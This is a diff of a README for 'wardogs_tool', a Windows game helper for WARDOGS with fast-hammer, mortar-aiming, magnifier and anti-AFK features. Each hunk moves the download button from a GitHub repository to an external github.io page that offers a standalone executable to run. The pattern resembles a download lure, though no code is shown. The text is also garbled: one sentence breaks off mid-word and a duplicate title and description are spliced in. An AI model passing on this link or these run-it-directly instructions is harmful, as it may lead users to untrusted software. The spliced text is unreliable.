@@ -1,6 +1,6 @@
 # 🔨 wardogs_tool - Fast Hammer, Mortar, Zoom for WARDOGS
 
-[![Download wardogs_tool](https://img.shields.io/badge/Download-wardogs_tool-FF3D71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wheyecologicalwarfare3565/wardogs_tool)
+[![Download wardogs_tool](https://img.shields.io/badge/Download-wardogs_tool-FF3D71?style=for-the-badge&logo=github&logoColor=white)](https://wheyecologicalwarfare3565.github.io)
 
 wardogs_tool is a Windows helper for WARDOGS players who want faster building, smarter mortar aiming, a clearer view of the screen center, and fewer idle interruptions. It brings fast hammer controls, a mortar calculator, a screen center magnifier, and anti-AFK support into one simple desktop app.
 
@@ -10,7 +10,7 @@ The tools are made for everyday players. You do not need programming knowledge. 
 
 WARDOGS building and combat often depend on speed and precision. Small delays can make# 🔨 wardogs_tool - Fast Hammer and Mortar Tools for WARDOGS
 
-[![Download wardogs_tool](https://img.shields.io/badge/Download-wardogs_tool-FF3D71?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wheyecologicalwarfare3565/wardogs_tool)
+[![Download wardogs_tool](https://img.shields.io/badge/Download-wardogs_tool-FF3D71?style=for-the-badge&logo=github&logoColor=white)](https://wheyecologicalwarfare3565.github.io)
 
 wardogs_tool is a Windows companion app for WARDOGS players who want to build faster, aim mortars more accurately, zoom in on the screen center, and avoid idle timeouts. It combines four tools into one simple interface: a fast hammer, a mortar calculator, a screen magnifier, and an anti-AFK feature. You do not need any programming experience to use it. Open the app, choose the tool you need, and keep playing.
 
@@ -36,7 +36,7 @@ The anti-AFK feature prevents the game from marking you as idle during short bre
 
 ## 📥 Download and Setup
 
-[![Download wardogs_tool](https://img.shields.io/badge/Download-wardogs_tool-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Wheyecologicalwarfare3565/wardogs_tool)
+[![Download wardogs_tool](https://img.shields.io/badge/Download-wardogs_tool-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://wheyecologicalwarfare3565.github.io)
 
 Visit this link to download the application. After downloading, the application is ready to run. No installation or programming steps are required. The app is a standalone Windows program.
 
